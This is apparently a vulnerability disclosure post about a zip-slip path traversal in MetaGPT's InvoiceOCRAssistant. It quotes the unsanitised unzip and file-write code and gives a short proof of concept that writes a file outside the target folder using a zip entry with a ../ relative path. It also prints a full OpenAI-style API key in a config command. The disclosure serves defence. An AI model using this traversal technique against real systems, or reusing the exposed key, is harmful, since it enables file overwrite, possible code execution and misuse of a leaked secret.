---
layout: post
title:  "Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt"
date:  2024-06-24 10:31:06 +0800
categories: file-overwrite
---

## Name

> Zipslip when parsing invoice zip file via InvoiceOCRAssistant

## Weakness

>  CWE-23: Relative Path Traversal

## Severity

> High (8.8)

## Version

> 0.8.1

## Description

In [`receipt_assistant`](https://docs.deepwisdom.ai/main/en/guide/use_cases/agent/receipt_assistant.html), Metagpt supports OCR recognition of invoice files in pdf, png, jpg, and zip formats. And the class [`InvoiceOCR`](https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L31C7-L31C17) is responsible for recognizing the invoice files. When the files is compressed with zip format, [`InvoiceOCR._unzip`](https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L63) is used to extract the files in zip file. However, the file name in zip file is not sanitized and appended to dest path directly, could cause zipslip attacks. It's possible to overwrite files in victims' mechine, causing code execution attacks.

[_unzip#L78](https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L78) function:

```
@staticmethod
async def _unzip(file_path: Path) -> Path:
    """Unzip a file and return the path to the unzipped directory.

    Args:
        file_path: The path to the zip file.

    Returns:
        The path to the unzipped directory.
    """
    file_directory = file_path.parent / "unzip_invoices" / datetime.now().strftime("%Y%m%d%H%M%S")
    with zipfile.ZipFile(file_path, "r") as zip_ref:
        for zip_info in zip_ref.infolist():
            # Use CP437 to encode the file name, and then use GBK decoding to prevent Chinese garbled code
            relative_name = Path(zip_info.filename.encode("cp437").decode("gbk"))
            if relative_name.suffix:
                # unsafe path appending
                full_filename = file_directory / relative_name
                await File.write(full_filename.parent, relative_name.name, zip_ref.read(zip_info.filename))

    logger.info(f"unzip_path: {file_directory}")
    return file_directory
```

[`File.write#L39`](https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39) function is reponsible for writing the file content in zip file to target path. In Line 39, `full_path = root_path / filename`, the `filename` is not santized, filename such as `../../../../../../../../test.txt` in zip file will be appended to `root_path`, causing path traversal and file overwrite. 

```
async def write(cls, root_path: Path, filename: str, content: bytes) -> Path:
    """Write the file content to the local specified path.

    Args:
        root_path: The root path of file, such as "/data".
        filename: The name of file, such as "test.txt".
        content: The binary content of file.

    Returns:
        The full filename of file, such as "/data/test.txt".

    Raises:
        Exception: If an unexpected error occurs during the file writing process.
    """
    root_path.mkdir(parents=True, exist_ok=True)
    full_path = root_path / filename
    async with aiofiles.open(full_path, mode="wb") as writer:
        await writer.write(content)
        logger.debug(f"Successfully write file: {full_path}")
        return full_path
```

## Proof of Concept

Firstly, let's create a zip file containing relative file name, and save as `auth.zip`:

```
zip auth.zip ../../../../../../../home/kali/test.py
```

Then, install metagpt and it's ocr extras:

```
pip install --upgrade metagpt
pip install --upgrade 'metagpt[ocr]'
```

After installed, we need to init metagpt with our openai key according to [official documentation](https://github.com/geekan/MetaGPT?tab=readme-ov-file#configuration):

```
# create 
> metagpt --init-config

# fill your openai key, this key is for testing
> sed -i 's/YOUR_API_KEY/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/g' /root/.metagpt/config2.yaml
```

Before attacks, let's check the `/home/kali/test.py` is empty path

```
> ls -la /home/kali/test.py
ls: cannot access '/home/kali/test.py': No such file or directory
```

### Start attack

Run following snippets from [offical tutorial](https://docs.deepwisdom.ai/main/en/guide/use_cases/agent/receipt_assistant.html#example-1) to parse and recognize our `auth.zip` file:

```
from metagpt.roles.invoice_ocr_assistant import InvoiceOCRAssistant, InvoicePath
from metagpt.schema import Message

role = InvoiceOCRAssistant()
await role.run(Message(content="Invoicing date", instruct_content=InvoicePath(file_path="auth.zip")))
```

Now let's check the file is overwritten successfully:

```
> ls -la /home/kali/test.py
-rw-r--r-- 1 root root 12 Jun 24 14:50 /home/kali/test.py
```

## Colab

Tested on google colab: [https://colab.research.google.com/drive/1ujE5yqxcB_RlRtXMfNSSeTYPLy6DMDwQ?usp=sharing](https://colab.research.google.com/drive/1ujE5yqxcB_RlRtXMfNSSeTYPLy6DMDwQ?usp=sharing)

![poc](https://live.staticflickr.com/65535/53811891297_68e84388c8_h.jpg)

## Impact

This vulnerability can have severe consequences. If victims parse and recognize an malicious zip file, zipslip can be achieved to overwrite files in victims mechine, causing potential code execution attack.

## Occurrences

[_unzip#L79](https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L79)

[write#L39](https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39)

